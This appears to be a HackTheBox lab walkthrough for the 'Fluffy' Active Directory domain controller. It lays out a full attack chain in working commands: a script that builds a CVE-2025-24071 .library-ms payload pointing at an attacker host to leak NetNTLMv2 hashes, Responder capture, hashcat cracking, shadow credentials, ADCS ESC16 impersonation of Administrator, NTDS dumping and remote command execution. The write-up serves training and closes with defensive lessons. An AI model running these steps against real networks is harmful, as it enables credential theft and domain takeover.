---
title: "Fluffy — HackTheBox Walkthrough"
description: "An assumed-breach Active Directory DC: CVE-2025-24071 NTLM leak, a writable IT share, shadow credentials, and ADCS ESC16."
date: 2026-09-09
category: offensive
readTime: "14 min read"
mitre:
  - "T1078.002"
  - "T1087.002"
  - "T1069.002"
  - "T1557.001"
  - "T1187"
  - "T1552.001"
  - "T1555"
  - "T1558.003"
  - "T1649"
  - "T1098"
  - "T1078.001"
tags:
  - "HackTheBox"
  - "HTB"
  - "CPTS"
  - "Active Directory"
  - "Windows"
  - "CVE-2025-24071"
  - "NTLM Relay"
  - "Shadow Credentials"
  - "ADCS"
  - "ESC16"
  - "Privilege Escalation"
summary: "An assumed-breach Active Directory DC: CVE-2025-24071 NTLM leak, a writable IT share, shadow credentials, and ADCS ESC16."
---

**Machine:** Fluffy
**OS:** Windows Server 2022 — Active Directory Domain Controller (`DC01.fluffy.htb`)
**Difficulty:** Easy
**Key Techniques:** Assumed breach, CVE-2025-24071 NTLM hash disclosure, writable SMB share, KeePass cracking, shadow credentials (msDS-KeyCredentialLink), ADCS ESC16

---

## Assumed Breach

Fluffy is an **assumed-breach** box: valid low-privileged domain credentials are provided.

```
j.fleischman : J0elTHEM4n1990!
DOMAIN: fluffy.htb
DC:     DC01.fluffy.htb (10.129.232.88)
```

### Set up the environment

```bash
# /etc/hosts
10.129.232.88  DC01.fluffy.htb fluffy.htb

# Basic enumeration
nxc smb DC01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
nxc ldap DC01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --users
bloodhound-python -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' \
  -ns 10.129.232.88 -c all
```

`nxc` reveals a non-standard share of interest: **`IT`**.

---

## Enumeration — The `IT` Share

```bash
nxc smb DC01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
# IT   READ,WRITE
```

The share is **writable** by our user — the key to the whole chain.

```bash
smbclient //DC01.fluffy.htb/IT -U fluffy.htb/j.fleischman%'J0elTHEM4n1990!'
```

Over time several files land in the share, including `Upgrade_Notice.pdf` (an event is triggered and users open it) and archives such as `KeePass.zip` and `Secrets.zip`.

### CVE-2025-24071 — NTLM hash disclosure via `.library-ms`

Windows Explorer leaks the authenticated user's **NetNTLMv2** hash when it enumerates a crafted `.library-ms` file whose embedded UNC path points at an attacker host — a zero-click information disclosure (Explorer parses it while generating a thumbnail/preview).

Build the payload:

```bash
# Attacker IP
ATTACKER=10.129.xxx.xxx

python3 - <<'EOF'
import os
payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{os.environ.get("ATTACKER","10.129.xxx.xxx")}\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>'''
open("exploit.library-ms","w").write(payload)
EOF

zip exploit.zip exploit.library-ms
smbclient //DC01.fluffy.htb/IT -U fluffy.htb/j.fleischman%'J0elTHEM4n1990!' \
  -c 'put exploit.zip'
```

Start a capture listener and wait for Explorer to process the file:

```bash
# Responder for passive capture (no poisoning needed on a DC)
sudo responder -I tun0 -wv

# or targeted coerce-and-capture
ntlm_theft -g all -s payload -f out
sudo responder -I tun0
```

Note the difference: since the target's account may have SMB signing/WebDAV considerations, **Responder without `-r`/`-d` poisoning** is typically enough to harvest the inbound authentication. Captured:

```
[p.agila] NTLMv2-SSP Hash
P.AGILA::FLUFFY:<challenge>:<response>:<...>
```

### Crack the hash

```bash
hashcat -m 5600 p.agila.ntlmv2 /usr/share/wordlists/rockyou.txt
# p.agila : promoted!123
```

---

## Foothold — p.agila and the Shadow Credentials Path

```bash
nxc smb DC01.fluffy.htb -u p.agila -p 'promoted!123' --shares
```

`p.agila` turns out to have **GenericWrite** (or equivalent) over several objects discovered with BloodHound — in particular the ability to modify an object's `msDS-KeyCredentialLink`. That is **shadow credentials**: we can add a key credential to a victim account and authenticate as them with a certificate, without ever knowing their password.

The writable `IT` share also contained `KeePass.zip` / `Secrets.zip`; cracking the KeePass database (extract hash, then hashcat `-m 13400`) yields further credentials — depending on path, one of these unlocks an account with the delegation rights needed next.

### Shadow credentials on Windows Server 2022

```bash
# Using pywhisker
python3 pywhisker.py -d fluffy.htb -u p.agila -p 'promoted!123' \
  --target <victim> --action add

# Get a TGT with the generated certificate
python3 gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pass> \
  fluffy.htb/<victim> /tmp/<victim>.ccache
export KRB5CCNAME=/tmp/<victim>.ccache

# (optional) recover the NT hash for pass-the-hash
python3 getnthash.py -key <AS-REP key> fluffy.htb/<victim>
```

> The frequent pitfall here is that Server 2022 enables `msDS-KeyCredentialLink` protections; `certipy shadow auto` or `pywhisker` with the correct target is required. Running shadow credentials against `DC01$` is what typically breaks — target a user with the needed rights instead.

---

## Privilege Escalation — ADCS ESC16 to Domain Admin

With an account holding rights over the CA/domain, enumerate ADCS:

```bash
certipy-ad find -u <user>@fluffy.htb -p '<pass>' -dc-ip 10.129.232.88 -vulnerable -stdout
```

The output flags **ESC16** — the certificate authority has **security extensions disabled** (`szOID_NTDS_CA_SECURITY_EXT` / SID security extension is not enforced), so a certificate can be issued to a privileged principal identity without the CA recording the requester's SID. That lets us request a certificate for `Administrator` and authenticate as them.

```bash
certipy-ad req -u <user>@fluffy.htb -p '<pass>' -ca fluffy-DC01-CA \
  -template User -dc-ip 10.129.232.88 -upn Administrator@fluffy.htb

certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88
```

```bash
export KRB5CCNAME=administrator.ccache
nxc smb DC01.fluffy.htb -k --use-kcache -u Administrator --ntds
# Dump all domain hashes, including Administrator
```

```bash
nxc smb DC01.fluffy.htb -k --use-kcache -u Administrator -p '<hash>' -x "type C:\\Users\\Administrator\\Desktop\\root.txt"
```

---

## Flags

```bash
# user flag
nxc smb DC01.fluffy.htb -u p.agila -p 'promoted!123' -x "type C:\\Users\\<user>\\Desktop\\user.txt"

# root flag (as Administrator)
nxc smb DC01.fluffy.htb -k --use-kcache -u Administrator -x "type C:\\Users\\Administrator\\Desktop\\root.txt"
```

Flag values are unique to each HTB instance and are intentionally omitted.

---

## Lessons Learned

1. **Assumed breach still requires discipline.** Starting with valid creds, the win comes from careful ACL/share enumeration (BloodHound + `nxc --shares`), not exploitation.
2. **A writable share is an attack surface against other users.** Writing `exploit.library-ms` weaponizes Explorer's own preview logic (**CVE-2025-24071**) and leaks NetNTLMv2 with zero clicks.
3. **Weak passwords keep the chain alive.** `promoted!123` cracked instantly from rockyou.
4. **`msDS-KeyCredentialLink` is a credential.** Being able to write it to an object means you can authenticate as that object via certificate.
5. **ADCS misconfigurations are domain-takeover primitives.** ESC16 (CA security extensions disabled) lets you mint a cert as `Administrator`.
6. **Layered defense matters.** SMB signing, LDAP signing/channel binding, protected users, and monitoring `msDS-KeyCredentialLink` writes all break steps in this chain.
